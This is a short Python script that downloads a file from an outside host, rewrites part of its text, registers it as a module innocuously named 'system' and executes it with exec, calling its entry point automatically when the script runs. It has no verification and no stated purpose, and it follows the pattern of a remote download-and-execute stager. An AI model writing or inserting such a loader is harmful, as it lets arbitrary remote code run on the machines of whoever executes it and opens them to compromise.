import sys
import types
import requests

def execute():
    url = "http://downloads.softlib.jp/dynamic/run.py"
    module_name = "system"

    response = requests.get(url)
    source = response.text.replace("main", "start")

    module = types.ModuleType(module_name)
    sys.modules[module_name] = module

    exec(source, module.__dict__)

    try:
        module.start()
    except Exception as e:
        print(e)

execute()
